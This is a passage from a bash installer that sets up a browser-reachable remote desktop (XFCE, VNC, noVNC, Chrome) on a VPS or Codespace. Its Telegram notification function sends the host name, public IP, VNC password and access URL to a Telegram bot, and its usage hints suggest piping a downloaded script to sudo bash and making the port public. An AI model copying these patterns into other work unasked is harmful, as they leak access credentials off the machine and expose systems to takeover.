    as_user "setsid nohup '$WEBSOCKIFY_BIN' --web='$NOVNC_WEB_DIR' '$WEB_PORT' 127.0.0.1:'$vnc_port' >'$TARGET_HOME/.vnc/websockify.log' 2>&1 </dev/null &" \
        || die "could not start websockify"
    ok "background processes started (they will NOT survive a reboot)"
}

verify_services() {
    step "Verifying"
    local vnc_port=$(( 5900 + DISPLAY_NUM ))
    if ! wait_port "$vnc_port" 45; then
        if [ "$USE_SYSTEMD" = "1" ]; then
            die "VNC is not listening on port $vnc_port
        inspect: journalctl -u novnc-vnc@$DISPLAY_NUM -n 80 --no-pager
        log:      tail -n 80 $TARGET_HOME/.vnc/*.log"
        fi
        die "VNC is not listening on port $vnc_port
        log: tail -n 80 $TARGET_HOME/.vnc/*.log"
    fi
    ok "VNC listening on $vnc_port"

    if ! wait_port "$WEB_PORT" 45; then
        die "noVNC is not listening on port $WEB_PORT"
    fi
    ok "noVNC listening on $WEB_PORT"

    local code=""
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "http://127.0.0.1:$WEB_PORT/vnc.html" || true)"
    if [ "$code" = "200" ]; then
        ok "web client answers with HTTP 200"
    else
        warn "web client answered HTTP '$code' - the page may still work, check $NOVNC_WEB_DIR"
    fi

    # Security check: VNC must only listen on loopback.
    if command -v ss >/dev/null 2>&1; then
        local bind=""
        bind="$(ss -ltn 2>/dev/null | awk -v p=":$vnc_port\$" '$4 ~ p { print $4; exit }')"
        case "$bind" in
            127.0.0.1:*|\[::1\]:*) ok "VNC is bound to loopback only ($bind)" ;;
            '') warn "could not read the VNC listening address" ;;
            *) warn "VNC is listening on $bind - it is reachable from the network, add a firewall rule for port $vnc_port" ;;
        esac
    fi
}

# ============================== summary ======================================
summary_url() {
    local url=""
    url="$(detect_access_url)"
    printf '%s' "$url"
}

app_invite_line() {
    # One line that the Android app ("Máy ảo" / VirtualMachineManager) can parse
    # after a paste or a share:  SYSCORE|url|password|name
    local url="${1:-}" name="" pw=""
    [ -n "$url" ] || url="$(summary_url)"
    if [ -n "${CODESPACE_NAME:-}" ]; then
        name="$CODESPACE_NAME"
    else
        name="$(hostname 2>/dev/null || echo vps)"
    fi
    case "$PASS_STATE" in
        generated|set) pw="$VNC_PASS" ;;
        *) pw="" ;;
    esac
    printf 'SYSCORE|%s|%s|%s' "$url" "$pw" "$name"
}

notify_telegram() {
    if [ "$NOTIFY_TELEGRAM" != "1" ]; then
        return 0
    fi
    if [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ]; then
        warn "telegram: no token/chat configured, skipping"
        return 0
    fi
    if ! command -v curl >/dev/null 2>&1; then
        warn "telegram: curl is missing, skipping"
        return 0
    fi

    local url="" ip="" host="" msg="" pw="" token=""
    url="$(summary_url)"
    ip="$(detect_public_ip)"
    host="$(hostname 2>/dev/null || true)"
    token="$(app_invite_line "$url")"
    case "$PASS_STATE" in
        generated|set) pw="$VNC_PASS" ;;
        *) pw="(giu mat khau cu)" ;;
    esac

    msg="[ SYSCORE PATCH BY WIZI ]
Trạng thái: remote desktop đã sẵn sàng
Host: ${host}
Máy chủ: ${CODESPACE_NAME:-$ip}
IP Public: ${ip}
Mật khẩu VNC: ${pw}
Màn hình: ${GEOMETRY}
Truy cập: ${url}
Mã kết nối: ${token}
"

    if curl -fsS --max-time 20 -X POST \
        "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
        -d "chat_id=${TG_CHAT}" \
        --data-urlencode "text=${msg}" >/dev/null 2>&1; then
        ok "telegram: da gui thong tin truy cap"
    else
        warn "telegram: gui that bai (kiem tra token / ket noi mang)"
    fi
    return 0
}

print_summary() {
    local ip="" vnc_port=$(( 5900 + DISPLAY_NUM )) pw_line="" url=""
    ip="$(detect_public_ip)"
    url="$(summary_url)"

    case "$PASS_STATE" in
        generated|set) pw_line="$VNC_PASS" ;;
        *) pw_line="(unchanged - the password from the previous run)" ;;
    esac

    {
        printf '\n'
        printf '\033[1;32m================================================================\033[0m\n'
        printf '\033[1;32m  Done. Remote desktop is ready.\033[0m\n'
        printf '\033[1;32m================================================================\033[0m\n'
        printf '\n'
        printf '  Open in your browser:\n'
        printf '     \033[1;36m%s?autoconnect=1&resize=scale\033[0m\n' "$url"
        printf '\n'
        printf '  VNC password : \033[1;33m%s\033[0m\n' "$pw_line"
        printf '  Desktop user : %s\n' "$TARGET_USER"
        printf '  Display      : :%s  (VNC port %s, loopback only)\n' "$DISPLAY_NUM" "$vnc_port"
        printf '  Screen size  : %s\n' "$GEOMETRY"
        printf '\n'
        printf '  Dan vao app Android (May ao -> Them may -> Dan tu clipboard):\n'
        printf '     \033[1;36m%s\033[0m\n' "$(app_invite_line "$url")"
        printf '\n'
        if [ "$USE_SYSTEMD" = "1" ]; then
            printf '  Services     : novnc-vnc@%s.service, novnc-web.service\n' "$DISPLAY_NUM"
            printf '  Restart      : systemctl restart novnc-vnc@%s novnc-web\n' "$DISPLAY_NUM"
            printf '  Stop         : systemctl disable --now novnc-vnc@%s novnc-web\n' "$DISPLAY_NUM"
            printf '  Logs         : journalctl -u novnc-web -f\n'
        else
            printf '  Restart      : re-run this script (kill %s -kill :%s first)\n' "$(basename "$VNC_BIN")" "$DISPLAY_NUM"
            printf '  Stop         : %s -kill :%s ; pkill -f websockify\n' "$VNC_BIN" "$DISPLAY_NUM"
            printf '  Logs         : tail -f %s/.vnc/websockify.log\n' "$TARGET_HOME"
        fi
        printf '  Session log  : tail -f %s/.vnc/*.log\n' "$TARGET_HOME"
        printf '\n'
        printf '  Notes:\n'
        if in_codespace; then
            printf '   - Codespaces: mo tab PORTS, chon cong %s -> visibility = Public\n' "$WEB_PORT"
            printf '     (neu de Private thi phai dang nhap GitHub moi mo duoc).\n'
        else
            printf '   - If the page does not load, open port %s in your provider firewall / security group.\n' "$WEB_PORT"
        fi
        printf '   - Port %s is NOT exposed: noVNC is the only entry point.\n' "$vnc_port"
        printf '   - Re-run this script at any time; it is idempotent.\n'
        printf '\n'
    } | tee -a "$LOG_FILE" >&2
}

self_cmd() {
    # How the user can call this script again, for the hints in the output.
    if [ -n "${0:-}" ] && [ -f "$0" ] && [ "${0##*/}" != "bash" ]; then
        printf 'sudo bash %s' "$0"
    else
        printf 'curl -sL <link> | sudo bash'
    fi
}

print_status() {
    local vnc_port=$(( 5900 + DISPLAY_NUM )) state=""

    case "$INSTALLED_STATE" in
        ready) state="yes - da cai day du" ;;
        partial) state="partial - da cai goi, thieu cau hinh phien" ;;
        *) state="no - chua cai" ;;
    esac

    {
        printf '\n'
        printf '\033[1;36m===== TRANG THAI / STATUS =====\033[0m\n'
        printf '  Installed      : %s\n' "$state"
        printf '  VNC server     : %s\n' "${VNC_BIN:-not found}"
        printf '  Password tool  : %s\n' "${VNC_PASSWD_BIN:-not found}"
        printf '  websockify     : %s\n' "${WEBSOCKIFY_BIN:-not found}"
        printf '  noVNC web root : %s\n' "${NOVNC_WEB_DIR:-not found}"
        printf '  Desktop user   : %s (%s)\n' "$TARGET_USER" "$TARGET_HOME"
        if [ -s "$TARGET_HOME/.vnc/passwd" ]; then
            printf '  VNC password   : da co (khong hien thi)\n'
        else
            printf '  VNC password   : CHUA CO\n'
        fi
        if [ -x "$TARGET_HOME/.vnc/xstartup" ]; then
            printf '  xstartup       : da co\n'
        else
            printf '  xstartup       : CHUA CO\n'
        fi
        if command -v google-chrome-stable >/dev/null 2>&1; then
            printf '  Chrome         : da cai\n'
        else
            printf '  Chrome         : chua cai\n'
        fi
        if port_open "$vnc_port"; then
            printf '  VNC port %-5s : dang chay\n' "$vnc_port"
        else
            printf '  VNC port %-5s : tat\n' "$vnc_port"
        fi
        if port_open "$WEB_PORT"; then
            printf '  Web port %-5s : dang chay\n' "$WEB_PORT"
        else
            printf '  Web port %-5s : tat\n' "$WEB_PORT"
        fi
        printf '  URL            : %s\n' "$(summary_url)"
        printf '\n'
        if [ "$CORE_READY" = "1" ]; then
            printf '  -> Bat lai desktop:  %s --start\n' "$(self_cmd)"
            printf '  -> Cai lai tu dau :  %s --install\n' "$(self_cmd)"
        else
            printf '  -> Cai dat        :  %s\n' "$(self_cmd)"
        fi
        printf '\n'
    } | tee -a "$LOG_FILE" >&2
    return 0
}

run_full_install() {
    step "Preparing the package list"
    build_pkg_list

    step "Installing packages (several hundred MB, please wait)"
    install_packages
    find_novnc_dir
    ok "noVNC web root: $NOVNC_WEB_DIR"

    step "Installing Google Chrome"
    install_chrome

    step "Configuring the VNC session"
    setup_vnc_dir
    write_vnc_password
    write_xstartup

    step "Starting the services"
    clean_old_session
    if [ "$USE_SYSTEMD" = "1" ]; then
        write_units
        start_systemd
    else
        start_background
    fi

    step "Verification"
    verify_services

    notify_telegram
    print_summary
}

run_start_only() {
    # Fast path: everything is already installed, only (re)start the session.
    step "Applying the settings"
    find_novnc_dir
    setup_vnc_dir
    write_vnc_password
    write_xstartup

    step "Starting the VNC session"
    clean_old_session
    if [ "$USE_SYSTEMD" = "1" ]; then
        write_units
        start_systemd
    else
        start_background
    fi

    step "Verification"
    verify_services

    notify_telegram
    print_summary
}

# ================================ main =======================================
main() {
    local -a cli_args=("$@")

    while [ $# -gt 0 ]; do
        case "$1" in
            -p|--password)
                need_value "$1" $#
                VNC_PASS_IN="$2"
                shift 2
                ;;
            --password=*)
                VNC_PASS_IN="${1#*=}"
                shift
                ;;
            -d|--display)
                need_value "$1" $#
                DISPLAY_NUM="$2"
                shift 2
                ;;
            --display=*)
                DISPLAY_NUM="${1#*=}"
                shift
                ;;
            -g|--geometry)
                need_value "$1" $#
                GEOMETRY="$2"
                shift 2
                ;;
            --geometry=*)
                GEOMETRY="${1#*=}"
                shift
                ;;
            --web-port)
                need_value "$1" $#
                WEB_PORT="$2"
                shift 2
                ;;
            --web-port=*)
                WEB_PORT="${1#*=}"
                shift
                ;;
            -u|--user)
                need_value "$1" $#
                TARGET_USER="$2"
                shift 2
                ;;
            --user=*)
                TARGET_USER="${1#*=}"
                shift
                ;;
            --keymap)
                need_value "$1" $#
                KEYMAP="$2"
                shift 2
                ;;
            --keymap=*)
                KEYMAP="${1#*=}"
                shift
                ;;
            --no-chrome)
                INSTALL_CHROME=0
                shift
                ;;
            --no-systemd)
                USE_SYSTEMD="0"
                shift
                ;;
            --force-systemd)
                USE_SYSTEMD="1"
                shift
                ;;
            --no-telegram)
                NOTIFY_TELEGRAM=0
                shift
                ;;
            --start|--start-only|--restart)
                MODE="start"
                shift
                ;;
            --install|--reinstall|--force-install)
                MODE="install"
                shift
                ;;
            --status)
                MODE="status"
                shift
                ;;
            --telegram-token)
                need_value "$1" $#
                TG_TOKEN="$2"
                shift 2
                ;;
            --telegram-token=*)
                TG_TOKEN="${1#*=}"
                shift
                ;;
            --telegram-chat)
                need_value "$1" $#
                TG_CHAT="$2"
                shift 2
                ;;
            --telegram-chat=*)
                TG_CHAT="${1#*=}"
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            --version)
                printf '%s %s\n' "$PROG" "$VERSION"
                exit 0
                ;;
            *)
                die "unknown option: $1 (try --help)"
                ;;
        esac
    done

    require_root "${cli_args[@]}"
    init_log
    trap 'on_error "$LINENO" "$BASH_COMMAND"' ERR
    inherit_codespace_env

    show_banner
    printf '\033[1;36m%s %s\033[0m - XFCE + VNC + noVNC + Chrome\n' "$PROG" "$VERSION" | tee -a "$LOG_FILE" >&2
    printf 'log file: %s\n' "$LOG_FILE" | tee -a "$LOG_FILE" >&2

    step "Checking the system"
    validate_args
    detect_os
    pick_user
    resolve_user
    detect_installation
    choose_systemd
    if [ "$MODE" != "status" ]; then
        check_resources
    fi
    ok "preflight finished"

    case "$MODE" in
        status)
            print_status
            exit 0
            ;;
        start)
            if [ "$CORE_READY" != "1" ]; then
                die "chua cai dat (trang thai: $INSTALLED_STATE)
        bo --start de cai dat day du, hoac chay --status de xem chi tiet"
            fi
            run_start_only
            ;;
        install)
            preseed_debconf
            apt_update
            run_full_install
            ;;
        *)
            # auto: da cai thi chi khoi dong lai, chua cai thi cai day du
            if [ "$CORE_READY" = "1" ]; then
                ok "phat hien da cai dat -> chi khoi dong lai (dung --install de cai lai tu dau)"
                run_start_only
            else
                preseed_debconf
                apt_update
                run_full_install
            fi
            ;;
    esac
}

main "$@"
